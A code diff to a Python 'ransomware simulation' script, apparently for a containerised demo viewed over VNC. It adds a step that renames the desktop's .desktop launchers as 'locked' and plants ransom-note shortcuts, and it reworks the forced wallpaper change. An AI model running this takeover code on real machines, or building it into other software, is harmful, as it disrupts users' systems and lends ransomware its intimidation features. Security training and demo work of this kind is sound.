@@ -106,6 +106,58 @@ def fake_encrypt_files():
     print(f"[RANSOMWARE] {encrypted_count} file(s) encrypted in {DUMMY_FILES_DIR}")
 
 
+def hijack_desktop_shortcuts():
+    """
+    Rename existing .desktop launchers and drop ransom-themed shortcuts so the
+    XFCE desktop visibly reflects the 'takeover' in VNC.
+    """
+    os.makedirs(DESKTOP, exist_ok=True)
+    readme = os.path.join(DESKTOP, "README_RANSOM.txt")
+
+    for name in list(os.listdir(DESKTOP)):
+        path = os.path.join(DESKTOP, name)
+        if (
+            name.endswith(".desktop")
+            and "NARA_" not in name
+            and os.path.isfile(path)
+        ):
+            try:
+                locked = path + ".NARA_LOCKED"
+                os.rename(path, locked)
+                print(f"[RANSOMWARE] Locked launcher: {name} → {name}.NARA_LOCKED")
+            except OSError as e:
+                print(f"[RANSOMWARE] Could not lock {name}: {e}")
+
+    # Ransom shortcuts (open ransom note in a terminal so it always works in the container)
+    templates = [
+        ("NARA__READ_ME.desktop", "!!! READ ME — RANSOM !!!", "dialog-warning"),
+        ("NARA__FILES_LOCKED.desktop", "Documents — LOCKED", "folder"),
+        ("NARA__BROWSER_LOCKED.desktop", "Browser — LOCKED", "web-browser"),
+        ("NARA__MAIL_LOCKED.desktop", "Mail — LOCKED", "internet-mail"),
+    ]
+    for fname, title, icon in templates:
+        path = os.path.join(DESKTOP, fname)
+        lines = [
+            "[Desktop Entry]",
+            "Version=1.0",
+            "Type=Application",
+            f"Name={title}",
+            "Comment=NARA ransomware simulation",
+            f"Icon={icon}",
+            "Terminal=false",
+            # Hold terminal open so the user can read the note in VNC
+            f"Exec=xfce4-terminal --hold -e \"bash -c 'head -60 {readme}; echo; echo ---; sleep 600'\"",
+            "",
+        ]
+        with open(path, "w", encoding="utf-8") as f:
+            f.write("\n".join(lines))
+        try:
+            os.chmod(path, 0o755)
+        except OSError:
+            pass
+        print(f"[RANSOMWARE] Desktop shortcut → {path}")
+
+
 def _create_ransom_wallpaper():
     """
     Create a solid dark-red PNG using only stdlib (struct + zlib).
@@ -150,18 +202,24 @@ def change_wallpaper():
         wallpaper = _create_ransom_wallpaper()
         print(f"[RANSOMWARE] Wallpaper image created → {wallpaper}")
 
-        # Try xfconf-query (XFCE4)
-        result = subprocess.run(
-            [
-                "xfconf-query", "-c", "xfce4-desktop",
-                "-p", "/backdrop/screen0/monitor0/workspace0/last-image",
-                "-s", wallpaper,
-            ],
-            capture_output=True, text=True, timeout=10
-        )
-        if result.returncode == 0:
+        os.environ.setdefault("DISPLAY", ":1")
+
+        # Find the correct XFCE wallpaper property (monitor name varies)
+        try:
+            props = subprocess.run(
+                ["xfconf-query", "-c", "xfce4-desktop", "-l"],
+                capture_output=True, text=True, timeout=5
+            )
+            for line in props.stdout.splitlines():
+                if "last-image" in line:
+                    subprocess.run(
+                        ["xfconf-query", "-c", "xfce4-desktop", "-p", line.strip(), "-s", wallpaper],
+                        capture_output=True, timeout=5
+                    )
             print("[RANSOMWARE] Wallpaper changed via xfconf-query")
             return
+        except Exception:
+            pass
 
         # Try feh as fallback
         result = subprocess.run(
@@ -208,6 +266,7 @@ def main(custom_message: str = ""):
     print_ascii_skull()
 
     drop_ransom_note(custom_message)
+    hijack_desktop_shortcuts()
     fake_encrypt_files()
     change_wallpaper()
 
